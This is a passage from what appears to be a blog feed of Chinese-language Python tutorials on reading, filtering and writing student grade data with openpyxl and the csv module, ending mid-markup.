        <content type="html"><![CDATA[<h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><p>openpyxl是用来处理Excel电子表格的Python第三方库，使用前需要现安装，<code>pip install openpyxl</code></p><h3 id="2-新建工作簿"><a href="#2-新建工作簿" class="headerlink" title="2.新建工作簿"></a>2.新建工作簿</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> Workbook<span class="token comment"># 新建工作簿</span>new_wb <span class="token operator">=</span> Workbook<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 将新建的工作簿保存为【新的Excel工作表.xlsx】</span>new_wb<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'./新的Excel工作表.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-读取工作簿"><a href="#3-读取工作簿" class="headerlink" title="3.读取工作簿"></a>3.读取工作簿</h3><ol><li><code>openpyxl.load_workbook()</code>可读取工作簿对象。</li><li>**工作簿对象[‘工作表’]**可读取工作表。</li><li>**工作表对象[行数]<strong>、</strong>工作表对象[‘列名’]**可读取行和列，得到一个元祖。</li><li>**工作表对象[行列]**得到一个单元格对象<code>Cell</code>。</li><li><strong>单元格对象.value</strong>得到这个单元格对象具体的值。<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token comment"># 打开【21计3成绩表.xlsx】工作簿</span>wb <span class="token operator">=</span> load_workbook<span class="token punctuation">(</span><span class="token string">'./Python成绩表.xlsx'</span><span class="token punctuation">)</span><span class="token comment"># 获取【'21计3'】工作表</span>ws_21J3 <span class="token operator">=</span> wb<span class="token punctuation">[</span><span class="token string">'21计3'</span><span class="token punctuation">]</span><span class="token comment"># 循环打印出第2行所有单元格的值</span><span class="token keyword">for</span> cell_2 <span class="token keyword">in</span> ws_21J3<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cell_2<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token comment"># 循环打印出第2列（B列）所有单元格的值</span><span class="token keyword">for</span> cell_B <span class="token keyword">in</span> ws_21J3<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cell_B<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token comment"># 打印出B1单元格的值</span><span class="token keyword">print</span><span class="token punctuation">(</span>ws_21J3<span class="token punctuation">[</span><span class="token string">'B1'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><ul><li>工作表对象还有<code>iter_rows()</code>方法，可以获得表中指定范围的数据。</li><li>参数<code>min_row</code>和<code>max_row</code>分别表示最小行索引和最大行索引，参数<code>min_col</code>和<code>max_col</code>分别表示最小列索引和最大列索引。最小行索的值默认为1，最大索引的值默认为表格中有数据的最下面一行的行数。</li><li>参数<code>values_only</code>决定是否返回单元格的值，如果为True则返回<strong>单元格的值</strong>，如果为False则返回<strong>单元格对象</strong>。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token comment"># 打开【21计3成绩表.xlsx】工作簿</span>wb <span class="token operator">=</span> load_workbook<span class="token punctuation">(</span><span class="token string">'./Python成绩表.xlsx'</span><span class="token punctuation">)</span><span class="token comment"># 获取【'21计3'】工作表</span>ws_21J3 <span class="token operator">=</span> wb<span class="token punctuation">[</span><span class="token string">'21计3'</span><span class="token punctuation">]</span><span class="token comment"># 返回第2行至第12行，第2列（B列）至第3列（C列）这个范围的单元格内的所有数据</span><span class="token keyword">for</span> row <span class="token keyword">in</span> ws_21J3<span class="token punctuation">.</span>iter_rows<span class="token punctuation">(</span>min_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> max_row<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> min_col<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> max_col<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> values_only<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-添加数据"><a href="#4-添加数据" class="headerlink" title="4.添加数据"></a>4.添加数据</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token comment"># 打开【21计3成绩表.xlsx】工作簿</span>wb <span class="token operator">=</span> load_workbook<span class="token punctuation">(</span><span class="token string">'./Python成绩表.xlsx'</span><span class="token punctuation">)</span><span class="token comment"># 获取【'21计3'】工作表</span>ws_21J3 <span class="token operator">=</span> wb<span class="token punctuation">[</span><span class="token string">'21计3'</span><span class="token punctuation">]</span><span class="token comment"># 添加数据只能是列表和元祖类型</span>ws_21J3<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'31'</span><span class="token punctuation">,</span><span class="token string">'新同学'</span><span class="token punctuation">,</span><span class="token string">'男'</span><span class="token punctuation">,</span><span class="token string">'55'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 添加完成后必须保存</span>wb<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'./Python成绩表.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>注意，如果要保存文件，别把工作簿打开，会报错。</em></p><h2 id="二、制作查询功能"><a href="#二、制作查询功能" class="headerlink" title="二、制作查询功能"></a>二、制作查询功能</h2><p>查询可以用字典的键值对来实现。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token comment"># 打开【21计3成绩表.xlsx】工作簿</span>wb <span class="token operator">=</span> load_workbook<span class="token punctuation">(</span><span class="token string">'./Python成绩表.xlsx'</span><span class="token punctuation">)</span><span class="token comment"># 获取【'21计3'】工作表</span>ws_21J3 <span class="token operator">=</span> wb<span class="token punctuation">[</span><span class="token string">'21计3'</span><span class="token punctuation">]</span><span class="token comment"># 创建学生信息字典</span>student_info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment"># 从第二行开始读取工作表中的信息</span><span class="token keyword">for</span> row <span class="token keyword">in</span> ws_21J3<span class="token punctuation">.</span>iter_rows<span class="token punctuation">(</span>min_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> values_only<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 取出学号</span>    student_number <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment"># 将信息存入学生信息字典</span>    student_info<span class="token punctuation">[</span>student_number<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'学号'</span><span class="token punctuation">:</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'姓名'</span><span class="token punctuation">:</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'性别'</span><span class="token punctuation">:</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'成绩'</span><span class="token punctuation">:</span>row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>student_info<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>student_info<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'姓名'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>完善一下交互体验吧。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token comment"># 打开【21计3成绩表.xlsx】工作簿</span>wb <span class="token operator">=</span> load_workbook<span class="token punctuation">(</span><span class="token string">'./Python成绩表.xlsx'</span><span class="token punctuation">)</span><span class="token comment"># 获取【'21计3'】工作表</span>ws_21J3 <span class="token operator">=</span> wb<span class="token punctuation">[</span><span class="token string">'21计3'</span><span class="token punctuation">]</span><span class="token comment"># 创建学生信息字典</span>students_info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment"># 从第二行开始读取工作表中的信息</span><span class="token keyword">for</span> row <span class="token keyword">in</span> ws_21J3<span class="token punctuation">.</span>iter_rows<span class="token punctuation">(</span>min_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> values_only<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 取出学号</span>    student_number <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment"># 将信息存入学生信息字典</span>    students_info<span class="token punctuation">[</span>student_number<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">'学号'</span><span class="token punctuation">:</span>row<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'姓名'</span><span class="token punctuation">:</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'性别'</span><span class="token punctuation">:</span>row<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token string">'成绩'</span><span class="token punctuation">:</span>row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># 输入你想查询的员工的工号</span>        student_number <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输出你想要查询的学号：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'请输入数字啊！！！'</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># 根据学号（键）找到学生信息（值）</span>        student_info <span class="token operator">=</span> students_info<span class="token punctuation">[</span>student_number<span class="token punctuation">]</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'数据表中没有这个学号'</span><span class="token punctuation">)</span>        <span class="token keyword">continue</span>    search_info <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输出你想查询的信息(如：姓名/性别/成绩)：'</span><span class="token punctuation">)</span>    <span class="token comment"># 判断该员工信息是否存在</span>    <span class="token keyword">if</span> student_info<span class="token punctuation">.</span>get<span class="token punctuation">(</span>search_info<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># dict.get()返回指定键的值，如果键不在字典中返回默认值 None 或者设置的默认值。  </span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'经查询，该学生的</span><span class="token interpolation"><span class="token punctuation">{</span>search_info<span class="token punctuation">}</span></span><span class="token string">为</span><span class="token interpolation"><span class="token punctuation">{</span>student_info<span class="token punctuation">[</span>search_info<span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'输入错误，只能查询姓名/性别/成绩'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、筛选迟到同学信息"><a href="#三、筛选迟到同学信息" class="headerlink" title="三、筛选迟到同学信息"></a>三、筛选迟到同学信息</h2><p>现需要筛选出迟到时间超过50分钟，并且迟到次数超过3次的同学，并将信息写入一张新的表格。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token punctuation">,</span>Workbook<span class="token comment"># 打开【21计3成绩表.xlsx】工作簿</span>wb <span class="token operator">=</span> load_workbook<span class="token punctuation">(</span><span class="token string">'./Python成绩表.xlsx'</span><span class="token punctuation">)</span><span class="token comment"># 获取【'21计3'】工作表</span>ws_21J3 <span class="token operator">=</span> wb<span class="token punctuation">[</span><span class="token string">'21计3'</span><span class="token punctuation">]</span><span class="token comment">#获得表头</span>header <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> row <span class="token keyword">in</span> ws_21J3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    header<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token comment"># 新建工作簿，存储迟到人员信息</span>new_wb <span class="token operator">=</span> Workbook<span class="token punctuation">(</span><span class="token punctuation">)</span>new_ws <span class="token operator">=</span> new_wb<span class="token punctuation">.</span>active  <span class="token comment"># 获得活动工作表（第一张表）</span><span class="token comment"># 先写入表头</span>new_ws<span class="token punctuation">.</span>append<span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token comment"># 从第二行开始依次读取</span><span class="token keyword">for</span> row <span class="token keyword">in</span> ws_21J3<span class="token punctuation">.</span>iter_rows<span class="token punctuation">(</span>min_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>values_only<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    late_time <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>    late_number <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> late_time <span class="token operator">&gt;</span> <span class="token number">50</span> <span class="token keyword">and</span> late_number <span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">迟到了</span><span class="token interpolation"><span class="token punctuation">{</span>late_time<span class="token punctuation">}</span></span><span class="token string">分钟，迟到了</span><span class="token interpolation"><span class="token punctuation">{</span>late_number<span class="token punctuation">}</span></span><span class="token string">次。"</span></span><span class="token punctuation">)</span>        new_ws<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">)</span>  <span class="token comment"># 将迟到人员的信息写入新表</span><span class="token comment"># 保存文件</span>new_wb<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'./迟到同学信息.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、找出悄悄改成绩的同学"><a href="#四、找出悄悄改成绩的同学" class="headerlink" title="四、找出悄悄改成绩的同学"></a>四、找出悄悄改成绩的同学</h2><p>在录入成绩之前，有同学趁办公室没人，悄悄修改了自己的成绩，为预防这种情况，成绩单还留了一份旧表，现需要对比两张表格，找出那个悄悄改成绩的同学。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token punctuation">,</span>Workbook<span class="token comment"># 打开原来的工作簿、工作表</span>old_wb <span class="token operator">=</span> load_workbook<span class="token punctuation">(</span><span class="token string">'./Python成绩表.xlsx'</span><span class="token punctuation">)</span>old_ws <span class="token operator">=</span> old_wb<span class="token punctuation">[</span><span class="token string">'21计3'</span><span class="token punctuation">]</span><span class="token comment"># 将旧表的信息做成一个字典，字典格式为{姓名:成绩}</span>score_dict <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">for</span> row <span class="token keyword">in</span> old_ws<span class="token punctuation">.</span>iter_rows<span class="token punctuation">(</span>min_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>values_only<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    score_dict<span class="token punctuation">[</span>row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token comment"># 打开被改动之后工作簿、工作表</span>new_wb <span class="token operator">=</span> load_workbook<span class="token punctuation">(</span><span class="token string">'./Python成绩表（被悄悄改动过）.xlsx'</span><span class="token punctuation">)</span>new_ws <span class="token operator">=</span> new_wb<span class="token punctuation">[</span><span class="token string">'21计3'</span><span class="token punctuation">]</span><span class="token comment"># 将新表中的数据一行行的拿出来对比</span><span class="token keyword">for</span> row <span class="token keyword">in</span> new_ws<span class="token punctuation">.</span>iter_rows<span class="token punctuation">(</span>min_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>values_only<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    score <span class="token operator">=</span> row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> score <span class="token operator">!=</span> score_dict<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">的成绩不对，和旧表匹配不上"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python数据分析2—csv文件读写</title>
      <link href="/2022/03/13/Python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%902%E2%80%94csv%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/"/>
      <url>/2022/03/13/Python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%902%E2%80%94csv%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="一、项目背景"><a href="#一、项目背景" class="headerlink" title="一、项目背景"></a>一、项目背景</h2><p>海盐商贸学校刚进行了Python测验，成绩记录在一张csv表中，但是有的同学发挥失利，成绩不太理想，如果进行公布，势必会伤及自尊。因此，需要把这张csv表进行拆分，每位同学一张表，每张表只有一位同学的成绩。</p><h2 id="二、CSV文件读取"><a href="#二、CSV文件读取" class="headerlink" title="二、CSV文件读取"></a>二、CSV文件读取</h2><h3 id="1-with-open-as-变量名"><a href="#1-with-open-as-变量名" class="headerlink" title="1.with open() as 变量名"></a>1.with open() as 变量名</h3><p><code>with open() as 变量名</code>是<code>open()</code>函数的优化，这种方法最大的不同就是不需要使用 <code>close()</code>函数关闭文件，因为我们总是会忘记关闭文件，导致占用大量系统资源，推荐使用这种方法。</p><h3 id="2-读取为列表"><a href="#2-读取为列表" class="headerlink" title="2.读取为列表"></a>2.读取为列表</h3><p><code>render()</code>函数是csv模块内的一个函数，用于读取csv文件对象，得到一个可迭代对象，该对象里面的每一个元素都是一个列表，每一个列表都对应了csv文件中的一行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> csv<span class="token comment"># newline=''可避免空行</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./Python期末成绩.csv'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8-sig'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">as</span> csv_file<span class="token punctuation">:</span>    <span class="token comment"># 读取文件对象，得到reader对象，reader对象是一个可迭代的列表</span>    csv_reader <span class="token operator">=</span> csv<span class="token punctuation">.</span>reader<span class="token punctuation">(</span>csv_file<span class="token punctuation">)</span>    <span class="token keyword">for</span> csv_row <span class="token keyword">in</span> csv_reader<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>csv_row<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-读取为字典"><a href="#3-读取为字典" class="headerlink" title="3.读取为字典"></a>3.读取为字典</h3><p>和<code>render()</code>函数不同的是，<code>DictReader()</code>实例化之后得到一个字典，字典的键就是表头，这个表头可以通过fieldnames属性得到。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> csv<span class="token comment"># newline=''可避免空行</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./Python期末成绩.csv'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8-sig'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">as</span> csv_file<span class="token punctuation">:</span>    <span class="token comment"># 读取文件对象，得到DictReader对象，DictReader对象是一个可迭代的字典，字典的键就是表头</span>    csv_reader <span class="token operator">=</span> csv<span class="token punctuation">.</span>DictReader<span class="token punctuation">(</span>csv_file<span class="token punctuation">)</span>    <span class="token comment"># 可通过fieldnames属性获取表头</span>    headers <span class="token operator">=</span> csv_reader<span class="token punctuation">.</span>fieldnames    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'表头：</span><span class="token interpolation"><span class="token punctuation">{</span>headers<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    <span class="token keyword">for</span> csv_row <span class="token keyword">in</span> csv_reader<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>csv_row<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、CSV文件写入"><a href="#三、CSV文件写入" class="headerlink" title="三、CSV文件写入"></a>三、CSV文件写入</h2><h3 id="1-写入列表数据"><a href="#1-写入列表数据" class="headerlink" title="1.写入列表数据"></a>1.写入列表数据</h3><p>写入文件需要先把<strong>文件对象</strong>转换为<strong>writer对象</strong>，然后调用<strong>writer对象</strong>的<code>writerow()</code>方法将数据写入文件，不过要注意数据必须是一个可迭代的对象，推荐使用列表。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> csvstudent_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token string">'小虎'</span><span class="token punctuation">,</span><span class="token string">'55'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token string">'小老虎'</span><span class="token punctuation">,</span> <span class="token string">'75'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span><span class="token comment"># 打开'./平时成绩.csv'文件，获取文件对象，如果没有会自动创建</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./平时成绩.csv'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">as</span> csv_file<span class="token punctuation">:</span>    <span class="token comment"># 将文件对象转换为writer对象</span>    csv_writer <span class="token operator">=</span> csv<span class="token punctuation">.</span>writer<span class="token punctuation">(</span>csv_file<span class="token punctuation">)</span>    <span class="token comment"># 将列表中的元素写入csv文件中</span>    <span class="token keyword">for</span> student <span class="token keyword">in</span> student_list<span class="token punctuation">:</span>        csv_writer<span class="token punctuation">.</span>writerow<span class="token punctuation">(</span>student<span class="token punctuation">)</span><span class="token comment"># 还有一种方法是writerows()，自己对比区别吧</span>    <span class="token comment"># csv_writer.writerows(student_list)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-写入字典数据"><a href="#2-写入字典数据" class="headerlink" title="2.写入字典数据"></a>2.写入字典数据</h3><p>如果要写入字典类型的数据，需要先将文件对象转换为<strong>DictWriter对象</strong>。<br>不过需要设置字典的键，也就是表头。<br>设置方法就是在实例化<strong>DictWriter</strong>对象时传入参数<code>fieldnames</code>，再调用<code>writeheader()</code>方法。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> csvstudent_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">'姓名'</span><span class="token punctuation">:</span><span class="token string">'小虎'</span><span class="token punctuation">,</span><span class="token string">'成绩'</span><span class="token punctuation">:</span><span class="token string">'65'</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">'姓名'</span><span class="token punctuation">:</span><span class="token string">'小老虎'</span><span class="token punctuation">,</span><span class="token string">'成绩'</span><span class="token punctuation">:</span><span class="token string">'85'</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token comment"># 设置表头</span>headers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'姓名'</span><span class="token punctuation">,</span> <span class="token string">'成绩'</span><span class="token punctuation">]</span><span class="token comment"># 打开'./平时成绩.csv'文件，获取文件对象，如果没有会自动创建</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./平时成绩.csv'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">as</span> csv_file<span class="token punctuation">:</span>    <span class="token comment"># 将文件对象转换为DictWriter对象</span>    csv_writer <span class="token operator">=</span> csv<span class="token punctuation">.</span>DictWriter<span class="token punctuation">(</span>csv_file<span class="token punctuation">,</span> fieldnames<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token comment"># 写入表头</span>    csv_writer<span class="token punctuation">.</span>writeheader<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 将列表中的元素写入csv文件中</span>    <span class="token keyword">for</span> student <span class="token keyword">in</span> student_list<span class="token punctuation">:</span>        csv_writer<span class="token punctuation">.</span>writerow<span class="token punctuation">(</span>student<span class="token punctuation">)</span>    <span class="token comment"># 还有一种方法是writerows()，自己对比区别吧</span>    <span class="token comment"># csv_writer.writerows(student_list)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、完成项目"><a href="#四、完成项目" class="headerlink" title="四、完成项目"></a>四、完成项目</h2><h3 id="1-用列表类型完成"><a 